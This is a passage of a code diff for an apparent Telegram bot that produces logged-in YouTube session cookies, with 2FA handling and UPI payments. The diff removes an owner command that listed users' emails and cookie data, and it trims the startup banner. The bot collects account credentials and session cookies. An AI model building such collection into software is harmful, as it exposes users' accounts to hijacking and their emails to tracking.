+        await message.reply(f"✅ UPI updated to `{upi_id}`")
     except:
-        await message.reply("❌ Usage: `/setupi your_upi_id`")
-
-@app.on_message(filters.command("logs") & filters.user(OWNER_ID))
-async def get_logs_cmd(client, message):
-    """Get recent logs from database"""
-    recent_logs = list(logs_col.find().sort("timestamp", -1).limit(20))
-    
-    if not recent_logs:
-        await message.reply("📝 No logs found.")
-        return
-    
-    msg = "📝 **Recent Activity Logs**\n\n"
-    for log in recent_logs:
-        time = log['timestamp'].strftime("%Y-%m-%d %H:%M:%S")
-        msg += f"🕒 `{time}`\n"
-        msg += f"👤 User: `{log['user_id']}`\n"
-        msg += f"📧 Email: `{log['email']}`\n"
-        msg += f"✅ Status: {log['status']}\n"
-        msg += f"📊 Cookies Size: {log['cookies_length']} bytes\n"
-        msg += f"⭐ Premium: {'Yes' if log.get('premium') else 'No'}\n"
-        msg += "─" * 20 + "\n"
-    
-    # Send as file if too long
-    if len(msg) > 4000:
-        await message.reply_document(
-            document=BytesIO(msg.encode()),
-            file_name=f"logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
-            caption="📝 Full logs"
-        )
-    else:
-        await message.reply(msg)
+        await message.reply("❌ Usage: /setupi upi_id")
 
 # ---------- FLASK FOR RENDER ----------
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def health():
-    return "🤖 YouTube Cookie Bot with Logging is running!", 200
-
-@flask_app.route('/health')
-def health_check():
-    return "OK", 200
+    return "Bot is running!", 200
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
@@ -635,25 +661,15 @@ def run_flask():
 
 # ---------- MAIN ----------
 if __name__ == "__main__":
-    # Start Flask thread
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.start()
+    threading.Thread(target=run_flask).start()
     
-    print("=" * 60)
-    print("🤖 YOUTUBE COOKIE BOT - SUPER PRO VERSION")
-    print("=" * 60)
-    print(f"👑 Owner ID: {OWNER_ID}")
-    print(f"📝 Log Channel ID: {LOG_CHANNEL_ID}")
-    print(f"🛡️ Admins: {ADMIN_IDS if ADMIN_IDS else 'None'}")
-    print(f"🌐 Port: {os.environ.get('PORT', 8080)}")
-    print(f"💾 MongoDB: Connected")
-    print("=" * 60)
-    print("✅ Features Enabled:")
-    print("   • Real YouTube Cookies")
-    print("   • 2FA Support")
-    print("   • Premium System")
-    print("   • Complete Logging")
-    print("   • Backup in Log Channel")
-    print("=" * 60)
+    print("=" * 50)
+    print("🤖 YOUTUBE COOKIE BOT - FINAL")
+    print("=" * 50)
+    print(f"👑 Owner: {OWNER_ID}")
+    print(f"📝 Log Channel: {LOG_CHANNEL_ID}")
+    print("✅ Full LOGGED-IN cookies support")
+    print("✅ Phone/2FA challenge handling")
+    print("=" * 50)
     
     app.run()
